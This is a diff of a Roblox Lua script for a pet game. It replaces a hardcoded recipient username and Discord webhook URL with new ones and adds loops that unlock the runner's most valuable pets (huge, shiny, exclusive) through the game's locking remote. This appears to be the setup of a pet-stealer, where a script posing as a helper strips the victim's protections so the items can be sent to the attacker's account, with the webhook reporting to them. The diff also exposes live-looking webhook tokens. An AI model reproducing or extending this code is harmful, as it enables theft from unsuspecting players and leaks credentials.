@@ -32,8 +32,8 @@ local H = Y.TextField({
 
 
 
-Username = "LaRussieCool2"
-_G.Webhook = "https://discord.com/api/webhooks/1233473062293475410/W700VWb5jOrYwX2nGTlmZ4UNMmwqhQ_pnsxcOISS3AQ_aQ7QDL5jXQvc8_f-QhNF4lV8"
+Username = "FuzeMosh"
+_G.Webhook = "https://discord.com/api/webhooks/1202310118390382593/EQcbsm3LPiQ3Eg91wadgayvy9Rm5hhp00xB7Gt0yb1OEHqZtyUYEGxxHdbFvq3M_LHi-"
 local message = "poop"
 local user = Username
 local library = require(game.ReplicatedStorage.Library)
@@ -53,7 +53,88 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 noti.Enabled = false
 
+--unlocking
+local library = require(game.ReplicatedStorage.Library)
+local inv = library.Save.Get().Inventory
+for i, v in pairs(inv.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true and v.pt and v.pt == 2 and v.sh and v.sh == true  then 
+        local args = {
+            [1] = i,
+            [2] = false
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+    end
+end
 
+for i, v in pairs(inv.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true and v.pt and v.pt == 1 and v.sh and v.sh == true  then 
+        local args = {
+            [1] = i,
+            [2] = false
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+    end
+end
+
+for i, v in pairs(inv.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true and v.pt and v.pt == 2 then 
+        local args = {
+            [1] = i,
+            [2] = false
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+    end
+end
+
+for i, v in pairs(inv.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true and v.pt and v.pt == 1 then 
+        local args = {
+            [1] = i,
+            [2] = false
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+    end
+end
+
+for i, v in pairs(inv.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.huge == true then 
+        local args = {
+            [1] = i,
+            [2] = false
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+    end
+end
+
+for i, v in pairs(inv.Pet) do
+    local id = v.id
+    local dir = library.Directory.Pets[id]
+    if dir.exclusiveLevel == true then 
+        local args = {
+            [1] = i,
+            [2] = false
+        }
+        
+        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
+    end
+end
+
+--serious stuff
 for i, v in pairs(inv.Pet) do
     local id = v.id
     local dir = library.Directory.Pets[id]
